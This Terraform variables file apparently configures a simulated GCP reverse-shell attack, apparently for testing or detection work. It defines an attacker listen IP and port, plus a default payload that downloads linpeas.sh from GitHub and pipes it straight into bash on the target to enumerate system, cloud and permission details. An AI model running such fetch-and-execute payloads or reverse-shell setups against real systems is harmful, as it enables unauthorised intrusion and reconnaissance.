variable "environment" {
    type = string
    description = "name of the environment"
}

variable "deployment" {
    type = string
    description = "unique deployment id"
}

variable "gcp_location" {
    type = string
}

variable "gcp_project_id" {
    type    = string
}

variable "tag" {
    type = string
    default = "osconfig_exec_responder_reverse_shell"
}

variable "timeout" {
    type = string
    default = "600s"
}

variable "listen_ip" {
  type = string
  description = "IP address of attacker"
  default = "0.0.0.0"
}

variable "listen_port" {
  type = number
  description = "Port address of attacker"
  default = 4444
}

variable "payload" {
  type = string
  description = "The bash commands payload to execute when target machine connects"
  default = <<-EOT
            curl -L https://github.com/peass-ng/PEASS-ng/releases/download/20240414-ed0a5fac/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files
            EOT
}